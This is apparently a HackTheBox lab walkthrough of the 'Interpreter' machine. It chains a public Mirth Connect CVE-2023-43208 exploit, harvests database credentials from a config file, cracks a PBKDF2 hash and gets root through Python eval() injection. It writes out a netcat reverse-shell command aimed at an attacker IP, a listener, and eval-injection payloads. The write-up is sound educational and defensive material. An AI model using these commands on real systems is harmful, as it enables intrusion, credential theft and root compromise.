---
title: HTB Interpreter Walkthrough
date: 2026-06-10
categories: [HackTheBox]
tags: [hackthebox, mirth-connect, ssh, python, hash-cracking, linux]
---

---

## **Introduction**

> **Difficulty:** Medium <br>
> **Platform:** HackTheBox <br>
> **Operating System:** Linux <br>
> **Techniques:** Unauthenticated RCE, Credential Harvesting, PBKDF2 Hash Cracking, Python eval() Injection

![Banner](/assets/img/posts/interpreter/banner.jpeg)

Interpreter is a medium Linux machine on HackTheBox.
We start by finding an old version of a healthcare software called Mirth Connect that has a known exploit.
We use it to get a shell on the machine, then dig through config files to find database passwords, crack a
password hash, and eventually get root by abusing a vulnerable Python function.

---

## **Attack Overview**

The overall attack path for this machine follows a fairly realistic progression:

```
Recon → Mirth Connect Discovery → CVE-2023-43208 RCE → Shell as mirth
        ↓
   Config File → DB Credentials → Hash Extraction → Hash Cracking
        ↓
   SSH as sedric → notif.py Analysis → eval() Injection → root
```

---

## **Reconnaissance**

We start by scanning the machine with Nmap to see what ports and services are open.

```bash
nmap -sCV -A <TARGET-IP>
```

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-03 08:26 EST
Nmap scan report for interpreter.htb (TARGET-IP)
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp  open  http     Jetty
|_http-title: Mirth Connect Administrator
| http-methods:
|_  Potentially risky methods: TRACE
443/tcp open  ssl/http Jetty
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
| Not valid after:  2075-09-19T12:50:05
|_http-title: Mirth Connect Administrator
| http-methods:
|_  Potentially risky methods: TRACE

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found three open ports:

| Port | Service       | Description                                      |
| ---- | ------------- | ------------------------------------------------ |
| 22   | SSH           | OpenSSH 9.2p1 on Debian 12                       |
| 80   | HTTP (Jetty)  | Mirth Connect Administrator interface            |
| 443  | HTTPS (Jetty) | Mirth Connect Administrator (SSL)                |

Port 22 is SSH, nothing to exploit here right now, but we'll keep it in mind in case we find login credentials later.

Ports 80 and 443 are both showing something called **Mirth Connect Administrator**.
Mirth Connect is an enterprise software used in healthcare environments, and it has a known history of serious vulnerabilities.
This is going to be our main target.

One other thing to note: the SSL certificate on port 443 has a 50-year expiry and is self-signed.
That's a strong sign this is a default install with very little hardening done on it.

Since the site uses a hostname, we add it to our hosts file so our browser can find it:

```bash
echo "<TARGET-IP> interpreter.htb" | sudo tee -a /etc/hosts
```

### **Web Enumeration**

When we visit port 80 in the browser, it redirects us to:

```text
http://interpreter.htb/webadmin/Index.action
```

![Homepage](/assets/img/posts/interpreter/mirth_homepage.png)

The page shows the **NextGen Healthcare Mirth Connect** login interface with two options: open the desktop app or use the web dashboard. The `.action` extension in the URL tells us this is a Java-based web app running on the backend.

The page also mentions a self-signed certificate, which matches what we saw in the Nmap results. This all points to a default, out-of-the-box installation with nothing hardened.

At this point we know:

* The admin panel is exposed to anyone, no network restrictions.
* The app is java based.
* It looks like a default install.

The next step is to figure out the exact version so we can look for known exploits.

### **Version Enumeration**

When we click **Launch Mirth Connect Administrator**, it downloads a file called `webstart.jnlp`. If we open that file, it shows us something very useful:

```xml
<jnlp codebase="http://interpreter.htb:80" version="4.4.0">
    <title>Mirth Connect Administrator 4.4.0</title>
    ...
    <argument>https://interpreter.htb:443</argument>
    <argument>4.4.0</argument>
```

The version is **4.4.0**. A quick search tells us that this version is vulnerable to **CVE-2023-43208**, 
a bug that lets anyone run commands on the server without needing to log in. It was fixed in version 4.4.1, but this machine is still running the old version.

![CVE](/assets/img/posts/interpreter/mirth_cve.png)

---

## **Initial Foothold**

### **Exploit Acquisition**

Now that we know the version is vulnerable, we look for a ready-made exploit. We find one on GitHub and clone it to our machine.

```bash
git clone https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc.git
cd CVE-2023-43208-mirth-connect-rce-poc
```

The folder includes a few scripts: the main exploit (`CVE-2023-43208.py`), an older related exploit, and a `detection.py` script we can use to check if the target is actually vulnerable before we run anything.

### **Vulnerability Verification**

Before running the actual exploit, let's confirm the target is vulnerable using the detection script:

```bash
python3 detection.py https://interpreter.htb
Server version: 4.4.0
Vulnerable to CVE-2023-43208.
```

It confirms version 4.4.0 and that the target is exploitable. Now we move on to getting a shell.

### **Remote Code Execution**

First, we open a listener on our machine to catch the incoming connection:

```bash
nc -lvnp 4444
```

Then we run the exploit and tell it to send a reverse shell back to us:

```bash
python3 CVE-2023-43208.py -u https://interpreter.htb -c 'nc -c sh <ATTACKER-IP> 4444'
```

A few seconds later, our listener receives a connection:

```text
connect to [<ATTACKER-IP>] from (UNKNOWN) [<TARGET-IP>] 48554
```

We check who we are:

```bash
id
uid=103(mirth) gid=111(mirth) groups=111(mirth)
```

We're in as the `mirth` user, the account that runs the Mirth Connect application. Since this shell is pretty basic, we upgrade it to a proper interactive one:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![Shell](/assets/img/posts/interpreter/shell.png)

Now we have a stable shell and can move around the filesystem properly.

---

## **Post-Exploitation Enumeration**

Now that we have a shell as `mirth`, we start looking around for anything useful, config files, passwords, anything that might help us move further.

We check the Mirth Connect installation folder:

![ls_la](/assets/img/posts/interpreter/ls_la.png)

The application is installed under `/usr/local/mirthconnect`. We have access to it since we're running as the `mirth` user. 
One folder that stands out is `conf/`, config files often contain passwords.

### **Credential Discovery**

We read the main config file:

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

Inside, we find database credentials stored in plain text:

```text
database         = mysql
database.url     = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = REDACTED
```

![Creds](/assets/img/posts/interpreter/creds.png)

The app is connecting to a local MariaDB database using the username `mirthdb` and the password `REDACTED`. 
These credentials are just sitting there in a readable file, a very common and dangerous misconfiguration.

---

## **Database Access & Hash Extraction**

We use the credentials we just found to log into the database:

```bash
mysql -u mirthdb -p -h 127.0.0.1 mc_bdd_prod
```

![DB](/assets/img/posts/interpreter/db_access.png)

After some digging in the database, we find a user called `sedric` along with what looks like a password hash encoded in Base64. This is our next target.

```sql
SHOW DATABASES;
SHOW TABLES;
DESCRIBE PERSON;
SELECT * FROM PERSON;
DESCRIBE PERSON_PASSWORD;
SELECT * FROM PERSON_PASSWORD;
```

![Hash](/assets/img/posts/interpreter/hash.png)

### **Password Hash Extraction and Cracking**

* After gaining access to the MariaDB database, we extracted the stored credentials from the `PERSON` and `PERSON_PASSWORD` tables using a SQL JOIN query.

* The extracted password value appeared to be Base64 encoded because it contained only valid Base64 characters and ended with `==`, which is commonly used as padding in Base64 strings.

* Decoding the value revealed a structured binary blob consisting of a salt and a derived key, which strongly resembled a PBKDF2-HMAC-SHA256 password format commonly used in Java applications such as Mirth Connect.

* The hash was reconstructed into a Hashcat-compatible PBKDF2-HMAC-SHA256 format using 600,000 iterations and saved into a file for offline cracking.

* Using Hashcat mode `10900` with the `rockyou.txt` wordlist successfully recovered the credentials for the `sedric` user, which were then used to get SSH access to the target system.

Now we can use Hashcat to crack the hash:

```shell
hashcat -m 10900 -a 0 sedric_hash.txt /usr/share/wordlists/rockyou.txt -w 3
```

We found the password for user **"sedric"**.

### **SSH Access as sedric**

After recovering the password for the `sedric` user, we used the credentials to authenticate to the target system via SSH.

```bash
ssh sedric@<TARGET-IP>
```

After entering the recovered password, we got an interactive shell as the `sedric` user and obtained the user flag.

![User_flag](/assets/img/posts/interpreter/user_flag.png)

---

## **Privilege Escalation**

After getting SSH access as `sedric`, we continued enumerating the system for potential privilege escalation vectors and internally exposed services.

### **Internal Service Discovery**

While reviewing listening services on the host, we identified an application bound locally on port `54321`.

![Process](/assets/img/posts/interpreter/process.png)

Since the service was only accessible through localhost, we investigated the Mirth Connect channel configuration stored inside the MariaDB database to understand how the application was being used internally.

```bash
mysql -u mirthdb -p'REDACTED' -h 127.0.0.1 -D mc_bdd_prod -e "SELECT CHANNEL FROM CHANNEL\G" | grep "127.0.0.1"
```

This revealed the following internal endpoint:

```xml
<host>http://127.0.0.1:54321/addPatient</host>
```

The configuration showed that Mirth Connect was forwarding processed patient data to a backend application listening locally on port `54321`.

### **Testing the Internal Endpoint**

From the Mirth Connect channel configuration, we identified the exact XML structure expected by the backend application. The transformer configuration revealed several fields being forwarded to the internal `/addPatient` endpoint, including `timestamp`, `sender_app`, `id`, `firstname`, `lastname`, `birth_date`, and `gender`.

Using this information, we recreated a legitimate patient record and submitted it directly to the service using Python and the `urllib.request` module.

The following payload was used to interact with the endpoint:

![Python_Payload](/assets/img/posts/interpreter/python_code.png)

The application processed the request successfully and returned a valid response, confirming that the internal service was reachable and actively handling XML patient data.

### **Identifying Code Execution**

Since the backend application was processing user-controlled XML data, the next step was to test whether any of the supplied fields were being evaluated insecurely.

We modified the `firstname` field and injected a Python expression that executes the `id` command on the system:

```python
<firstname>{__import__("os").popen("id").read()}</firstname>
```

The modified XML payload was then sent to the `/addPatient` endpoint using the same Python request structure as before.

![Code_Execution](/assets/img/posts/interpreter/code_execution.png)

The response returned:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed that the backend service was vulnerable to Python code injection and that commands were being executed with root privileges.

### **Reading the Root Flag**

Since arbitrary Python code execution was possible, we used the vulnerability to directly read the root flag from the filesystem.

We replaced the previous payload with a Python expression that opens and reads `/root/root.txt`:

```python
<firstname>{open("/root/root.txt").read()}</firstname>
```

After sending the modified request to the endpoint, the application returned the contents of the root flag.

![Root_flag](/assets/img/posts/interpreter/root_flag.png)

---

## **Conclusion**

Interpreter was a very realistic machine that showed how multiple smaller weaknesses can be chained together into a full system compromise. The attack path started with identifying an outdated Mirth Connect instance vulnerable to **CVE-2023-43208**, which gave us unauthenticated remote code execution and an initial foothold as the `mirth` user.

From there, insecure credential storage inside configuration files exposed database credentials, allowing direct access to the backend MariaDB instance. Enumerating the database revealed PBKDF2-HMAC-SHA256 password hashes, which were reconstructed into a crackable format and successfully recovered offline using Hashcat.

Finally, after getting SSH access as `sedric`, further enumeration uncovered an internally exposed Flask application vulnerable to unsafe Python `eval()` usage. By abusing the XML processing functionality, arbitrary Python code execution was achieved as `root`, leading to full system compromise.

Some key takeaways from this machine:

* the dangers of running outdated enterprise software with publicly known vulnerabilities,
* risks introduced by storing sensitive credentials inside readable configuration files,
* how weak password storage practices can still lead to credential compromise,
* and the severe impact of insecure functions such as Python `eval()` processing user-controlled input.

Overall, Interpreter was a great demonstration of post-exploitation enumeration, credential harvesting, hash reconstruction, and privilege escalation through insecure application design.
